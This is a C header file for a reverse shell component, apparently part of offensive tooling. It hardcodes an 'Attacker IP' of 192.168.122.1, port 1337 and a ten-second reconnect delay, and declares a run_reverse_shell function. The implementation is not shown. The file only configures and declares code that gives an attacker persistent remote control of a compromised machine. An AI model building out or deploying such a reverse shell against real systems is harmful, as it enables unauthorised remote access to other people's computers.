#ifndef __REVERSE_SHELL_H
#define __REVERSE_SHELL_H

#define REMOTE_IP "192.168.122.1" /* Attacker IP */
#define REMOTE_PORT 1337
#define RECONNECT_DELAY 10 /* Seconds between reconnects */

/**
 * @brief Run reverse shell with fixed IP and port.
 * 
 */
void run_reverse_shell();

#endif /* __REVERSE_SHELL_H */
